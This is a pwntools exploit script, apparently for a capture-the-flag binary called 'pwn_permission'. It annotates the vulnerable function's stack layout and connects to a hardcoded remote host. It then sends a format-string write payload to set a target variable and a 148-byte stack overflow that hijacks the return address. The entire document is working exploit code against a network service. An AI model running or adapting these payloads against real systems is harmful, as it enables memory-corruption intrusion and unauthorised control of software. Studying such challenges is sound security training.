from pwn import *

context(arch='i386', os='linux', log_level='debug')

elf = ELF('pwn_permission')

# Let me re-analyze the vuln function stack layout more carefully
# vuln:
# 0x8049227:  push    ebp           ; save old ebp
# 0x8049228:  mov     ebp, esp      ; set new frame pointer
# 0x804922a:  push    ebx           ; save ebx (at ebp-4)
# 0x804922b:  sub     esp, 0x94     ; allocate 0x94 bytes on stack
# ...
# 0x804925a:  lea     eax, [ebp - 0x90]   ; buffer at ebp-0x90
# 0x8049260:  push    eax
# 0x8049261:  push    0                  ; fd=0 (stdin)
# 0x8049263:  call    0x8049040          ; read(0, buf, 0x100)
# ...
# 0x804926b:  mov     ebx, dword ptr [ebp - 4]  ; restore ebx
# 0x804926e:  leave                    ; mov esp, ebp; pop ebp
# 0x804926f:  ret

# Stack layout:
# ebp+4:  return address
# ebp:    saved ebp
# ebp-4:  saved ebx
# ebp-0x90: buffer start (where read writes to)

# Distance from buffer start to return address:
# buffer is at ebp-0x90
# return address is at ebp+4
# offset = 0x90 + 4 = 148

# BUT WAIT: the read is read(0, ebp-0x90, 0x100) = read(0, buf, 256)
# The buffer is 0x90 bytes from ebp, but we can write 0x100 bytes
# 0x100 = 256, 0x90 = 144
# So we can overwrite 256 - 144 = 112 bytes past the buffer
# That's enough to overwrite saved ebx (at ebp-4), saved ebp (at ebp), and ret addr (at ebp+4)

# Let me verify with a simpler test - just overwrite the return address with vuln_addr
# to see if we get another "Input:\n"

buf_to_ret = 0x90 + 4  # 148

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln_addr = elf.symbols['vuln']
target_val_addr = 0x804c030

# Connect
conn = remote('39.96.193.120', 10000)

# Receive initial message
conn.recv(timeout=5)

# Stage 1: Format string to set target_val = 5
fmt_payload = p32(target_val_addr) + b'%1c%4$n'
conn.send(fmt_payload)

import time
time.sleep(1)
response = conn.recv(timeout=5)
log.info(f"After fmt payload: {response}")

# Stage 2: Simple ROP - just return to vuln to test
rop_payload = b'A' * buf_to_ret
rop_payload += p32(vuln_addr)   # return to vuln

conn.send(rop_payload)

time.sleep(2)

# Check if we get "Input:\n" from vuln
try:
    response2 = conn.recv(timeout=5)
    log.info(f"After ROP to vuln: {response2}")
    
    if b'Input:' in response2:
        log.success("Successfully returned to vuln!")
    else:
        log.info("Did not get Input: prompt")
except Exception as e:
    log.error(f"Error: {e}")

conn.close()